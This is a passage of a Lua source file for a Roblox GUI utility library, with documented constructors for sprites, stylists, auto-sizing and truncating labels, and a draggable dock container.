Gets the padding amount for a Frame or GuiButton that has its Style property set.

Arguments:
	`object`
		The Frame or GuiButton to get he padding from.

Returns:
	`padding`
		The padding amount of `object`
]==]

local function GetPadding(object)
	local base_size = 0
	local base_pad = 0
	if object:IsA"Frame" then
		if object.Style == Enum.FrameStyle.ChatBlue
		or object.Style == Enum.FrameStyle.ChatGreen
		or object.Style == Enum.FrameStyle.ChatRed then
			base_size = 60
			base_pad = 17
		elseif object.Style == Enum.FrameStyle.RobloxSquare
		or object.Style == Enum.FrameStyle.RobloxRound then
			base_size = 21
			base_pad = 8
		else
			return 0
		end
	elseif object:IsA"GuiButton" then
		if object.Style == Enum.ButtonStyle.RobloxButtonDefault
		or object.Style == Enum.ButtonStyle.RobloxButton then
			base_size = 36
			base_pad = 12
		else
			return 0
		end
	else
		return 0
	end
	local size = math.min(object.AbsoluteSize.x,object.AbsoluteSize.y)
	if size < base_size then
		return size/base_size*base_pad
	else
		return base_pad
	end
end

lib.GetPadding = GetPadding

--[[DEPEND:]]

doc["Sprite"] = [==[
Sprite ( Content `sprite_map`, GuiObject `sprite_frame`, Vector2, `sprite_size`, Vector2 `sprite_map_size`, bool `fix_blur` ) [constructor]
	returns: Sprite `object`, GuiObject `sprite_frame`

Creates a sprite from a sprite map (an image that holds smaller "sub-images").

Arguments:
	`sprite_map`
		The image to use as the sprite map.

	`frame`
		The object that will contain the sprite image.
		Optional; defaults to a new Frame

	`sprite_size`
		The dimensions of one sprite on the sprite map.
		Optional; defaults to [32, 32]

	`sprite_map_size`
		The dimensions of the sprite map.
		Optional; defaults to [256, 256]

	`fix_blur`
		Indicates whether image blurriness should be fixed.
		Blurriness occurs because GUIs are offset by half a pixel, causing images to render "in-between" pixels.
		This can be fixed by using Scaled position to offset the image by 0.5 pixels.
		Optional; defaults to true

Returns:
	`object`
		The Sprite object.

	`sprite_frame`
		The sprite GUI.


Sprite Class:
	This class contains the following members:
	Readonly:
		GUI
			The sprite GUI.

	Methods:
		SetOffset ( number `row`, number `column` )
			Sets the offset of the sprite on the sprite map.
			`row` and `column` represent the row and column on the sprite map, starting from 0.
			For example, an offset of [0, 2] would select the third sprite in the first row.

		GetOffset ( )
			Returns the current offset of the sprite.

		Destroy ( )
			Releases the resources used by this object.
			Run this if you're no longer using this object.
]==]

local function CreateSprite(sprite_map,SpriteFrame,sprite_size,map_size,fix_blur)
	sprite_size = sprite_size or Vector2.new(32,32)
	map_size = map_size or Vector2.new(256,256)
	if fix_blur == nil then fix_blur = true end

	if not SpriteFrame then
		SpriteFrame = Create'Frame'{
			Name = "Sprite";
			BackgroundTransparency = 1;
		}
	end
	SpriteFrame.ClipsDescendants = true;
	local MapFrame = Create'ImageLabel'{
		Name = "SpriteMap";
		Active = false;
		BackgroundTransparency = 1;
		Image = sprite_map;
		Size = UDim2.new(map_size.x/sprite_size.x,0,map_size.y/sprite_size.y,0);
		Parent = SpriteFrame;
	};

	local off_row,off_col = 0,0

	local SetOffset = fix_blur
	and function(row,col)
		local size = SpriteFrame.AbsoluteSize
		MapFrame.Position = UDim2.new(-col - 0.5/size.x,0,-row - 0.5/size.y,0)
		off_row,off_col = row,col
	end
	or function(row,col)
		MapFrame.Position = UDim2.new(-col,0,-row,0)
		off_row,off_col = row,col
	end;

	if fix_blur then
		SpriteFrame.Changed:connect(function(p)
			if p == "AbsoluteSize" then
				SetOffset(off_row,off_col)
			end
		end)
	end

	local Class = {
		GUI = SpriteFrame;
		SetOffset = SetOffset;
		GetOffset = function()
			return off_row,off_col
		end;
	}

	function Class.Destroy()
		for k in pairs(Class) do
			Class[k] = nil
		end
		SpriteFrame:Destroy()
	end

	return Class,SpriteFrame
end

lib.Sprite = CreateSprite

--[[DEPEND:]]

doc["Stylist"] = [==[
Stylist ( table `style` ) [constructor]
	returns: Stylist `object`, table `style`

Creates a new stylist, which manages the properties of an entire group of objects.

More stylists can also be added, refered to as "substylists".

When a property of a stylist is updated, the properties in the stylist's objects are updated to reflect it.
The properties of objects in each substylist are also updated, but only if that property isn't defined in the substylist's Style.

Arguments:
	`style`
		A table of property/value pairs.
		The stylist's "Style".
		Optional; defaults to an empty table.

Returns:
	`object`
		The Stylist object.

	`style`
		The style table.


Stylist Class:
	Contains the following members:

	Readonly:
		Style
			The `style` table.

	Methods:
		AddObject ( Instance `object`, table `alias_map` )
			Adds `object` to the stylist and updates its properties.
			If `alias_map` is specified, then for this object, properties in the style will first be mapped though this table (see Alias Maps).
			Returns `object`

		AddObjects ( table `objects`, table `alias_map` )
			Adds multiple objects to the stylist.
			`objects` is a list of objects to be added to the stylist.
			If `alias_map` is specified, it will be applied to all objects in the list.
			Returns `objects`

		RemoveObject ( Instance `object` )
			Removes `object` from the stylist.
			Returns `object`

		RemoveObjects ( table `objects` )
			Removes multiple objects from the stylist.
			`objects` is a list of objects to be removed from the stylist.
			Returns `objects`

		GetObjects ( )
			Returns a list of objects added to this stylist.
			Items in the list have no defined order.

		ObjectIn ( Instance `object` )
			If `object` is in the stylist, returns true.
			If `object` has an alias in the stylist, returns the alias.
			Otherwise, returns false.

		SetProperty ( string `property`, * `value` )
			Sets `property` in each object to `value`.
			Also sets the value in the `style` table.

		SetProperties ( table `properties` )
			Similar to SetProperty, but sets multiple properties at once.
			`properties` is a table of property/value pairs.
			To set a property to nil, use ]==]..PROJECT_NAME..[==[.NULL as the value.

		ClearProperties ( )
			Clears all set properties in the style table.

		Update ( )
			Updates each object's properties to reflect values in the `style` table.

		SetInternal ( string `property`, * `value` )
			Sets the properties of the stylist's objects and substylists without modifying the stylist's Style.

		Destroy ( )
			Releases the resources used by this object.
			Run this if you're no longer using this object.

		AddStylist ( Stylist `stylist`, table `alias_map` )
			Adds `stylist` to this stylist and updates its properties.
			If `alias_map` is specified, then for this stylist, properties in the style will first be mapped though this table (see Alias Maps).
			Adding two stylists to each other is not recommended.

		RemoveStylist ( Stylist `stylist` )
			Removes `stylist` for this stylist.

		GetStylists ( )
			Returns a list of stylists added to this stylist.
			Items in the list have no defined order.

		StylistIn ( Stylist `stylist` )
			If `stylist` is in the stylist, returns true.
			If `stylist` has an alias in the stylist, returns the alias.
			Otherwise, returns false.


Alias Maps:
	These let you set the property of an object as if it were another.
	For example, if an alias map contains ["TextColor3"] = "BackgroundColor3", then
	the object will have its BackgroundColor3 property set using the TextColor3 value in the Style.
	This implies that both properties have the same type, or at least be convertible.
]==]

local function CreateStylist(StyleTable)
	StyleTable = StyleTable or {}
	local ParentStylists = {}
	local Class = {
		Style = StyleTable;
		ParentStylists = ParentStylists;
	}

	local ObjectLookup = WEAK_TABLES and setmetatable({},WEAK_MODE.K) or {}
	local AliasObjectLookup = WEAK_TABLES and setmetatable({},WEAK_MODE.K) or {}
									-- ISSUE: objects are getting dropped when they obviously haven't been collected 
	local StylistLookup = WEAK_TABLES and setmetatable({},WEAK_MODE.K) or {}
	local AliasStylistLookup = WEAK_TABLES and setmetatable({},WEAK_MODE.K) or {}
	
	local function pset(t,k,v)
		t[k] = v
	end

	local function set_object(object,property,value)
		pcall(pset,object,property,value)
	end

	local function set_stylist(stylist,property,value)
		if stylist.Style[property] == nil then
			stylist.SetInternal(property,value)
		end
	end

	local function set_alias_object(object,alias_map,property,value)
		local alias = alias_map[property]
		if alias then
			pcall(pset,object,alias,value)
		else
			pcall(pset,object,property,value)
		end
	end

	local function set_alias_stylist(stylist,alias_map,property,value)
		local alias = alias_map[property]
		if alias then
			if stylist.Style[alias] == nil then
				stylist.SetInternal(alias,value)
			end
		else
			if stylist.Style[property] == nil then
				stylist.SetInternal(property,value)
			end
		end
	end
	
	local function AddObject(object,alias_map)
		if type(alias_map) == "table" then
			AliasObjectLookup[object] = alias_map
			for property,value in pairs(StyleTable) do
				set_alias_object(object,alias_map,property,value)
			end
		else
			ObjectLookup[object] = true
			for property,value in pairs(StyleTable) do
				set_object(object,property,value)
			end
		end
		for parent in pairs(ParentStylists) do
			parent.Update(Class)
		end
		return object
	end

	local function AddObjects(objects,alias_map)
		if type(alias_map) == "table" then
			for i,object in pairs(objects) do
				AliasObjectLookup[object] = alias_map
				for property,value in pairs(StyleTable) do
					set_alias_object(object,alias_map,property,value)
				end
			end
		else
			for i,object in pairs(objects) do
				ObjectLookup[object] = true
				for property,value in pairs(StyleTable) do
					set_object(object,property,value)
				end
			end
		end
		for parent in pairs(ParentStylists) do
			parent.Update(Class)
		end
		return objects
	end
	
	local function RemoveObject(object)
		ObjectLookup[object] = nil
		AliasObjectLookup[object] = nil
		return object
	end

	local function RemoveObjects(objects)
		for i,object in pairs(objects) do
			ObjectLookup[object] = nil
			AliasObjectLookup[object] = nil
		end
		return objects
	end

	local function GetObjects()
		local list = {}
		for object in pairs(ObjectLookup) do
			list[#list+1] = object
		end
		for object in pairs(AliasObjectLookup) do
			list[#list+1] = object
		end
		return list
	end

	local function ObjectIn(object)
		if ObjectLookup[object] then
			return true
		elseif AliasObjectLookup[object] then
			return ObjectAliasLookup[object]
		else
			return false
		end
	end

	local function AddStylist(stylist,alias_map)
		stylist.ParentStylists[Class] = true
		if alias_map and type(alias_map) == "table" then
			AliasStylistLookup[stylist] = alias_map
			for property,value in pairs(StyleTable) do
				set_alias_stylist(stylist,alias_map,property,value)
			end
		else
			StylistLookup[stylist] = true
			for property,value in pairs(StyleTable) do
				set_stylist(stylist,property,value)
			end
		end
		for parent in pairs(ParentStylists) do
			parent.Update(Class)
		end
		return stylist
	end

	local function RemoveStylist(stylist)
		stylist.ParentStylists[Class] = nil
		StylistLookup[stylist] = nil
		AliasStylistLookup[stylist] = nil
		return stylist
	end

	local function GetStylists()
		local list = {}
		for stylist in pairs(StylistLookup) do
			list[#list+1] = stylist
		end
		for stylist in pairs(AliasStylistLookup) do
			list[#list+1] = stylist
		end
		return list
	end

	local function StylistIn(stylist)
		if StylistLookup[stylist] then
			return true
		elseif AliasStylistLookup[stylist] then
			return StylistAliasLookup[stylist]
		else
			return false
		end
	end

	local function SetInternal(property,value)
		for object in pairs(ObjectLookup) do
			set_object(object,property,value)
		end
		for stylist in pairs(StylistLookup) do
			set_stylist(stylist,property,value)
		end
		for object,alias_map in pairs(AliasObjectLookup) do
			set_alias_object(object,alias_map,property,value)
		end
		for stylist,alias_map in pairs(AliasStylistLookup) do
			set_alias_stylist(stylist,alias_map,property,value)
		end
	end
	
	local function SetProperty(property,value)
		if value == nil or value == NULL then
			StyleTable[property] = nil
			for parent in pairs(ParentStylists) do
				parent.Update(Class)
			end
		else
			StyleTable[property] = value
			SetInternal(property,value)
		end
	end
	
	local function SetProperties(new_style)
		local continue = false
		for property,value in pairs(new_style) do
			if value == NULL then
				StyleTable[property] = nil
				continue = true
			else
				StyleTable[property] = value
				SetInternal(property,value)
			end
		end
		if continue then
			for parent in pairs(ParentStylists) do
				parent.Update(Class)
			end
		end
	end

	local function ClearProperties()
		for property,value in pairs(StyleTable) do
			StyleTable[property] = nil
		end
		for parent in pairs(ParentStylists) do
			parent.Update(Class)
		end
	end
	
	local function Update(object)
		for parent in pairs(ParentStylists) do
			parent.Update(Class)
		end
		if object then
			if ObjectLookup[object] then
				for property,value in pairs(StyleTable) do
					set_object(object,property,value)
				end
			elseif StylistLookup[object] then
				for property,value in pairs(StyleTable) do
					set_stylist(object,property,value)
				end
			elseif AliasObjectLookup[object] then
				local alias_map = AliasObjectLookup[object]
				for property,value in pairs(StyleTable) do
					set_alias_object(object,alias_map,property,value)
				end
			elseif AliasStylistLookup[object] then
				for property,value in pairs(StyleTable) do
					set_alias_stylist(object,alias_map,property,value)
				end
			end
		else
			for property,value in pairs(StyleTable) do
				SetInternal(property,value)
			end
		end
	end

	Class.AddObject = AddObject;
	Class.AddObjects = AddObjects;
	Class.RemoveObject = RemoveObject;
	Class.RemoveObjects = RemoveObjects;
	Class.GetObjects = GetObjects;
	Class.ObjectIn = ObjectIn;
	Class.AddStylist = AddStylist;
	Class.RemoveStylist = RemoveStylist;
	Class.GetStylists = GetStylists;
	Class.StylistIn = StylistIn;
	Class.SetInternal = SetInternal;
	Class.SetProperty = SetProperty;
	Class.SetProperties = SetProperties;
	Class.ClearProperties = ClearProperties;
	Class.Update = Update;

	function Class.Destroy()
		for parent in pairs(ParentStylists) do
			parent.RemoveStylist(Class)
			ParentStylists[parent] = nil
		end
		for k in pairs(Class) do
			Class[k] = nil
		end
		for k in pairs(ObjectLookup) do
			ObjectLookup[k] = nil
		end
		for k in pairs(AliasObjectLookup) do
			AliasObjectLookup[k] = nil
		end
		for k in pairs(StylistLookup) do
			StylistLookup[k] = nil
		end
		for k in pairs(AliasStylistLookup) do
			AliasStylistLookup[k] = nil
		end
	end
	
	return Class,StyleTable
end

lib.Stylist = CreateStylist

--[[DEPEND:]]

doc["AutoSizeLabel"] = [==[
AutoSizeLabel ( GuiText `label` ) [constructor]
	returns: AutoSizeLabel `object`, GuiText `label`

Creates a text GUI that automatically resizes to its text.
Note that this is dependant on the TextBounds property.

Arguments:
	`label`
		An object to turn into an auto-sizing label.
		Optional; defaults to a new TextLabel

Returns:
	`object`
		The AutoSizingLabel object.
	`label`
		The auto-sizing label GUI.


AutoSizeLabel Class:
	This class contains the following members:

	Read-Only:
		GUI
			The auto-sizing label GUI.

	Methods:
		LockAxis ( number `x`, number `y` )
			Locks the size of the label on an axis to a specific amount.
			`x` sets the amount, in pixels, to lock to on the x axis.
			`y` sets the amount, in pixels, to lock to on the y axis.
			Passing either value as nil will unlock that respective axis.

		SetPadding ( number `pt`, number `pr`, number `pb`, number `pl` )
			Sets the padding for each side of the label.
			
			Passing four values specifies the top, right, bottom, and left, in that order.
			Passing three values specifies the top (`pt`), right/left (`pr`), and bottom (`pb`).
			Passing two values specifies the top/bottom (`pt`), and right/left (`pr`).
			Passing one value specifies that all sides have that value.
			Passing no values sets all sides to 0.
			
			If the text is aligned to a certain side, the padding on that side will be ignored.

		Update ( )
			Updates the label.

		Destroy ( )
			Releases the resources used by this object.
			Run this if you're no longer using this object.
]==]

local function CreateAutoSizeLabel(Label)
	local Class = {}
	if not Label then
		Label = Create'TextLabel'{
			Name = "AutoSizeLabel";
			BackgroundColor3 = Color3.new(0,0,0);
			BorderColor3 = Color3.new(1,1,1);
			TextColor3 = Color3.new(1,1,1);
			FontSize = "Size14";
			Font = "ArialBold";
		}
	end
	Class.GUI = Label
	
	local pt,pr,pb,pl = 0,0,0,0
	local t,r,b,l = 0,0,0,0
	local lx,ly
	local function Update()
		local bounds = Label.TextBounds
		local x = lx or bounds.x+l+r
		local y = ly or bounds.y+t+b
		Label.Size = UDim2.new(0,x,0,y)
	end
	Class.Update = Update
	
	local function reflectPadding()
		t,r,b,l = pt,pr,pb,pl
		if Label.TextXAlignment == Enum.TextXAlignment.Left then
			l = 0
		elseif Label.TextXAlignment == Enum.TextXAlignment.Right then
			r = 0
		end
		if Label.TextYAlignment == Enum.TextYAlignment.Top then
			t = 0
		elseif Label.TextYAlignment == Enum.TextYAlignment.Bottom then
			b = 0
		end
		Update()
	end

	local function SetPadding(nt,nr,nb,nl)
		if nl then
			pt,pr,pb,pl = nt,nr,nb,nl
		elseif nb then
			pt,pr,pb,pl = nt,nr,nb,nr
		elseif nr then
			pt,pr,pb,pl = nt,nr,nt,nr
		elseif nt then
			pt,pr,pb,pl = nt,nt,nt,nt
		else
			pt,pr,pb,pl = 0,0,0,0
		end
		reflectPadding()
	end
	Class.SetPadding = SetPadding
	
	local function LockAxis(x,y)
		lx,ly = x,y
		Update()
	end
	Class.LockAxis = LockAxis
	
	local con = Label.Changed:connect(function(p)
		if p == "TextBounds" then
			Update()
		elseif p == "TextXAlignment" or p == "TextYAlignment" then
			reflectPadding()
		end
	end)
	
	local function Destroy()
		for k in pairs(Class) do
			Class[k] = nil
		end
		con:disconnect()
	end
	Class.Destroy = Destroy
	
	Update()
	
	return Class,Label
end

lib.AutoSizeLabel = CreateAutoSizeLabel

--[[DEPEND:]]

doc["TruncatingLabel"] = [==[
TruncatingLabel ( GuiText `label` ) [constructor]
	returns: GuiText `label`

Creates a label that displays truncated text.
When the label is hovered over, the full text is displayed.

Arguments:
	`label`
		An object that will be turned into a truncating label.
		Optional; defaults to a new GuiText

Returns:
	`label`
		The label GUI.
]==]

local function CreateTruncatingLabel(Label)
	if not Label then
		Label = Create'TextLabel'{
			BackgroundColor3 = Color3.new(0,0,0);
			BorderColor3 = Color3.new(1,1,1);
			TextColor3 = Color3.new(1,1,1);
			FontSize = "Size14";
			Font = "ArialBold";
			Text = "";
		}
	end
	Label.ClipsDescendants = true;

	local FullTextLabel = Create'TextLabel'{
		Name = "FullTextLabel";
		BackgroundColor3 = Label.BackgroundColor3;
		BorderColor3 = Label.BorderColor3;
		TextColor3 = Label.TextColor3;
		FontSize = Label.FontSize;
		Font = Label.Font;
		Text = Label.Text;
		Visible = false;
		ZIndex = 9;
		Parent = Label;
	}

	local ex = {
		Name = true;
		Parent = true;
		Position = true;
		Size = true;
		ClipsDescendants = true;
		ZIndex = true;
		Visible = true;
	}

	local function pset(t,k,v)
		t[k] = v
	end

	Label.Changed:connect(function(p)
		if not ex[p] then
			pcall(pset,FullTextLabel,p,Label[p])
		end
	end)

	Label.MouseEnter:connect(function()
		local align = Label.TextXAlignment
		local bound = math.max(Label.TextBounds.x+4,Label.AbsoluteSize.x)
		if align == Enum.TextXAlignment.Center then
			FullTextLabel.Size = UDim2.new(0,bound,1,0)
			FullTextLabel.Position = UDim2.new(0.5,-bound/2,0,0)
		elseif align == Enum.TextXAlignment.Right then
			FullTextLabel.Size = UDim2.new(0,bound,1,0)
			FullTextLabel.Position = UDim2.new(1,-bound,0,0)
		else
			FullTextLabel.Size = UDim2.new(0,bound,1,0)
			FullTextLabel.Position = UDim2.new(0,0,0,0)
		end
		Label.ClipsDescendants = false
		SetZIndex(FullTextLabel,9)
		FullTextLabel.Visible = true
	end)

	FullTextLabel.MouseLeave:connect(function()
		FullTextLabel.Visible = false
		Label.ClipsDescendants = true
	end)

	return Label
end

lib.TruncatingLabel = CreateTruncatingLabel

--[[DEPEND:]]

doc["DockedSide"] = [==[
DockedSide [enum]

Represents a side that a dockable was docked on.

Enumerators:
	0:None
		Represents no sides of a dockable
	1:Left
		Represents the left side of a dockable
	2:Right
		Represents the right side of a dockable
	4:Top
		Represents the top side of a dockable
	8:Bottom
		Represents the bottom side of a dockable
]==]

local DockedSide = {
	None = 0;
	Left = 1;
	Top = 2;
	Right = 4;
	Bottom = 8;
	[0] = 'None';
	[1] = 'Left';
	[2] = 'Top';
	[4] = 'Right';
	[8] = 'Bottom';
}
lib.DockedSide = DockedSide

--[===[
doc["DockedSide"] = [==[
[enum] DockedSide

Represents a side that a dockable was docked on.

Enumerators:
	Left
		Represents the left side of a dockable
	Right
		Represents the right side of a dockable
	Top
		Represents the top side of a dockable
	Bottom
		Represents the bottom side of a dockable

	XAxis
		Represents docking on the XAxis
		Equal to Left and Right
	YAxis
		Represents docking on the YAxis
		Equal to Top and Bottom
	Inner
		Represents docking on the inner sides (towards 0,0)
		Equal to Left and Top
	Outer
		Represents docking on the outer sides (away from 0,0)
		Equal to Right and Bottom

	None
		Represents no sides, or neither the X nor Y axis
		Equal to Center
	Center
		Represents no docking, or docked on neither the inner or outer sides
		Equal to None

Value Casts:
	-1, "-1"
		-> Inner
	0, "0"
		-> Center
	1, "1"
		-> Outer
	"x", "X"
		-> XAxis
	"y", "Y"
		-> YAxis
	"" (empty string)
		-> None
]==]

local DockedSide do
	local enum = setmetatable({__type = "DockedSide"},ENUM_MT)
	local mt = {
		__eq = function(a,b)
			local n = b[1]
			for i = 1,#a do
				if a[i] == n then
					return true
				end
			end
			return false
		end;
		__tostring = function(e)
			return e.__type..'.'..e[1]
		end;
	}

---- Enumerators
	enum.Left	= setmetatable({__type = enum.__type, 'Left','XAxis','Inner'},mt)
	enum.Right	= setmetatable({__type = enum.__type, 'Right','XAxis','Outer'},mt)
	enum.Top	= setmetatable({__type = enum.__type, 'Top','YAxis','Inner'},mt)
	enum.Bottom	= setmetatable({__type = enum.__type, 'Bottom','YAxis','Outer'},mt)

	enum.XAxis	= setmetatable({__type = enum.__type, 'XAxis','Left','Right'},mt)
	enum.YAxis	= setmetatable({__type = enum.__type, 'YAxis','Top','Bottom'},mt)
	enum.Inner	= setmetatable({__type = enum.__type, 'Inner','Left','Top'},mt)
	enum.Outer	= setmetatable({__type = enum.__type, 'Outer','Right','Bottom'},mt)

	enum.None	= setmetatable({__type = enum.__type, 'None','Center'},mt)
	enum.Center	= setmetatable({__type = enum.__type, 'Center','None'},mt)

---- Value Casts
	enum['x'] = enum.XAxis
	enum['y'] = enum.YAxis
	enum[''] = enum.None

	enum['X'] = enum.XAxis
	enum['Y'] = enum.YAxis

	enum[-1] = enum.Inner
	enum[0] = enum.Center
	enum[1] = enum.Outer

	enum['-1'] = enum.Inner
	enum['0'] = enum.Center
	enum['1'] = enum.Outer

---- Finish
	DockedSide = enum
	lib.DockedSide = enum
end
]===]

doc["DockContainer"] = [==[
DockContainer ( GuiBase `container` ) [constructor]
	returns: DockContainer `object`, GuiBase `container`

Creates a container whose children can snap to each others' edges when dragged (referred to as "dockables").
Only children that are GuiButtons will be made draggable.
However, they will still dock to any sibling that is a GuiObject.

Arguments:
	`container`
		An object that becomes the dock container.
		Optional; defaults to a new ScreenGui

Returns:
	`object`
		The DockContainer object.

	`container`
		The container GUI.

DockContainer Class:
	This class contains the following members:

	Readonly:
		GUI
			The container GUI.

	Fields:
		SnapWidth
			A number indicating the space (in pixels) required between the edges of two dockables before one snaps to the other.
			Initially, this value is 16.

		ConstrainToContainer
			A bool indicating whether dockables can't be dragged outside the container.
			Initially, this value is false.

		SnapToContainerEdge
			A bool indicating whether dockables can snap to the edge of the container.
			Only applies if ConstrainToContainer is false.
			Initially, this value is true.

		PositionScaled
			A bool indicating whether the position of dockables are set as a Scale or an Offset.
			Initially, this value is true.

		DragZIndex
			A number indicating the amount to increase the ZIndex of a dockable by when it is dragged.
			Initially, this value is 1.

	Methods:
		InvokeDrag ( GuiObject `dragged`, Vector2 `mouse_offset` )
			Starts dragging `dragged` as if it were clicked.
			`mouse_offset` is the position of the mouse when it "clicked" the object, in relation to the object.

		StopDrag ( )
			Stops the dragging of an object, if there is an object being dragged.

	Callbacks:
		DragBeginCallback ( GuiObject `dragged`, Vector2 `mouse_offset` )
			Called before an object starts being dragged.
			`dragged` is the object being dragged.
			`mouse_offset` is the position of the mouse, in relation to the object.
			If the function returns false, then the drag will be canceled.

		DragCallback ( GuiObject `dragged`, Vector2 `mouse_offset` )
			Called when an object is dragged, before the object updates.
			`dragged` is the object being dragged.
			`mouse_offset` is the location of the mouse when it started dragging, in relation to the object.
			If the function returns false, then the object's position will not be updated.

		DockCallback ( GuiObject `dragged`, GuiObject `docked`, DockedSide `docked_side` )
			Called before the currently dragged object snaps to another dockable.
			`dragged` is the current object being dragged.
			`docked` is the dockable that `dragged` snapped to.
			`docked_side` is the side of `dragged` that was docked on.
			Note that `docked` can be the container, if objects are allowed to snap to it.
			If the function returns false, then the snap to the dockable will be canceled.

	Events:
		DragBegin ( GuiObject `dragged`, Vector2 `mouse_offset` )
			Fired after an object start being dragged.
			`dragged` is the object being dragged.
			`mouse_offset` is the position of the mouse, in relation to the object.

		DragStopped ( GuiObject `dragged`, Vector2 `mouse_pos` )
			Called after an object stops being dragged.
			`dragged` is the object that was dragged.
			`mouse_offset` is the position of the mouse when it started dragging, in relation to the object.

		ObjectDocked ( GuiObject `dragged`, GuiObject `docked`, DockedSide `docked_side` )
			Fired after the currently dragged objects snaps to another dockable.
			`dragged` is the current object being dragged.
			`docked` is the dockable that `dragged` snapped to.
			`docked_side` is the side of `dragged` that was docked on.
			Note that `docked` can be the container, if objects are allowed to snap to it.
]==]

local function CreateDockContainer(Container)
	if not Container then
		Container = Instance.new("ScreenGui")
		Container.Name = "DockContainer"
	end

	local Class = {
		GUI = Container;
		SnapWidth = 16;
		SnapToEdge = true;
		ConstrainToContainer = false;
		PositionScaled = true;
		DragZIndex = 1;
	}

	local DragEvent = {}
	local MouseDrag = Create'ImageButton'{
		Active = false;
		Size = UDim2.new(1.5, 0, 1.5, 0);
		AutoButtonColor = false;
		BackgroundTransparency = 1;
		Name = "MouseDrag";
		Position = UDim2.new(-0.25, 0, -0.25, 0);
		ZIndex = 10;
	}

	local function stopDragDefault()
		return false,"no object is being dragged"
	end
	Class.StopDrag = stopDragDefault

	local eventDragBegin = Instance.new("BindableEvent")
	Class.DragBegin = eventDragBegin.Event

	local eventDragStopped = Instance.new("BindableEvent")
	Class.DragStopped = eventDragStopped.Event

	local eventObjectDocked = Instance.new("BindableEvent")
	Class.ObjectDocked = eventObjectDocked.Event

	local function InvokeDrag(dockable,mouse_offset)
		if Class.DragBeginCallback then
			if Class.DragBeginCallback(dockable,mouse_offset)
			== false then return end
		end

		local drag_con
		local up_con

		drag_con = MouseDrag.MouseMoved:connect(function(x,y)
			if Class.DragCallback then
				if Class.DragCallback(dockable,mouse_offset)
				== false then return end
			end

			local snapWidth = Class.SnapWidth

			local cApos = Container.AbsolutePosition
			local Apos = Vector2.new(x,y) - mouse_offset

			local cAsize = Container.AbsoluteSize
			local Asize = dockable.AbsoluteSize

			local APX,APY = Apos.x,Apos.y
			local ASX,ASY = Asize.x,Asize.y

			x = Apos.x - cApos.x
			y = Apos.y - cApos.y

			local docked_x,docked_y
			local side_x,side_y

			if Class.DockCallback then
				for i,sibling in pairs(Container:GetChildren()) do
					if sibling:IsA"GuiObject" and sibling ~= dockable and sibling.Visible then
						local sApos = sibling.AbsolutePosition
						local sAsize = sibling.AbsoluteSize

						if Apos.x + Asize.x >= sApos.x and Apos.x <= sApos.x + sAsize.x then
							if math.abs((Apos.y + Asize.y) - sApos.y) <= snapWidth then
								if Class.DockCallback(dockable,sibling,DockedSide.Bottom) ~= false then
									-- docked on bottom side
									y = sApos.y - cApos.y - Asize.y
									eventObjectDocked:Fire(dockable,sibling,DockedSide.Bottom)
								end
							elseif math.abs(Apos.y - (sApos.y + sAsize.y)) <= snapWidth then
								if Class.DockCallback(dockable,sibling,DockedSide.Top) ~= false then
									-- docked on top side
									y = sApos.y - cApos.y + sAsize.y
									eventObjectDocked:Fire(dockable,sibling,DockedSide.Top)
								end
							end
						end
						if Apos.y + Asize.y >= sApos.y and Apos.y <= sApos.y + sAsize.y then
							if math.abs((Apos.x + Asize.x) - sApos.x) <= snapWidth then
								if Class.DockCallback(dockable,sibling,DockedSide.Right) ~= false then
									-- docked on right side
									x = sApos.x - cApos.x - Asize.x
									eventObjectDocked:Fire(dockable,sibling,DockedSide.Right)
								end
							elseif math.abs(Apos.x - (sApos.x + sAsize.x)) <= snapWidth then
								if Class.DockCallback(dockable,sibling,DockedSide.Left) ~= false then
									-- docked on left side
									x = sApos.x - cApos.x + sAsize.x
									eventObjectDocked:Fire(dockable,sibling,DockedSide.Left)
								end
							end
						end
					end
				end
				if Class.ConstrainToContainer then
					if APY < cApos.y then
						if Class.DockCallback(dockable,Container,DockedSide.Top) ~= false then
							-- docked on top side
							y = 0
							eventObjectDocked:Fire(dockable,Container,DockedSide.Top)
						end
					elseif APY + ASY > cApos.y + cAsize.y then
						if Class.DockCallback(dockable,Container,DockedSide.Bottom) ~= false then
							-- docked on bottom side
							y = cAsize.y - ASY
							eventObjectDocked:Fire(dockable,Container,DockedSide.Bottom)
						end
					end
					if APX < cApos.x then
						if Class.DockCallback(dockable,Container,DockedSide.Left) ~= false then
							-- docked on left side
							x = 0
							eventObjectDocked:Fire(dockable,Container,DockedSide.Left)
						end
					elseif APX + ASX > cApos.x + cAsize.x then
						if Class.DockCallback(dockable,Container,DockedSide.Right) ~= false then
							-- docked on right side
							x = cAsize.x - ASX
							eventObjectDocked:Fire(dockable,Container,DockedSide.Right)
						end
					end
				elseif Class.SnapToEdge then
					if math.abs(APY - cApos.y) <= snapWidth then
						if Class.DockCallback(dockable,Container,DockedSide.Top) ~= false then
							-- docked on top side
							y = 0
							eventObjectDocked:Fire(dockable,Container,DockedSide.Top)
						end
					elseif math.abs((APY+ASY) - (cApos.y+cAsize.y)) <= snapWidth then
						if Class.DockCallback(dockable,Container,DockedSide.Bottom) ~= false then
							-- docked on bottom side
							y = cAsize.y - ASY
							eventObjectDocked:Fire(dockable,Container,DockedSide.Bottom)
						end
					end
					if math.abs(APX - cApos.x) <= snapWidth then
						if Class.DockCallback(dockable,Container,DockedSide.Left) ~= false then
							-- docked on left side
							x = 0
							eventObjectDocked:Fire(dockable,Container,DockedSide.Left)
						end
					elseif math.abs((APX+ASX) - (cApos.x+cAsize.x)) <= snapWidth then
						if Class.DockCallback(dockable,Container,DockedSide.Right) ~= false then
							-- docked on right side
							x = cAsize.x - ASX
							eventObjectDocked:Fire(dockable,Container,DockedSide.Right)
						end
					end
				end
			else
				for i,sibling in pairs(Container:GetChildren()) do
					if sibling:IsA"GuiObject" and sibling ~= dockable and sibling.Visible then
						local sApos = sibling.AbsolutePosition
						local sAsize = sibling.AbsoluteSize

						if Apos.x + Asize.x >= sApos.x and Apos.x <= sApos.x + sAsize.x then
							if math.abs((Apos.y + Asize.y) - sApos.y) <= snapWidth then
								y = sApos.y - cApos.y - Asize.y
								eventObjectDocked:Fire(dockable,sibling,DockedSide.Bottom)
							elseif math.abs(Apos.y - (sApos.y + sAsize.y)) <= snapWidth then
								y = sApos.y - cApos.y + sAsize.y
								eventObjectDocked:Fire(dockable,sibling,DockedSide.Top)
							end
						end
						if Apos.y + Asize.y >= sApos.y and Apos.y <= sApos.y + sAsize.y then
							if math.abs((Apos.x + Asize.x) - sApos.x) <= snapWidth then
								x = sApos.x - cApos.x - Asize.x
								eventObjectDocked:Fire(dockable,sibling,DockedSide.Right)
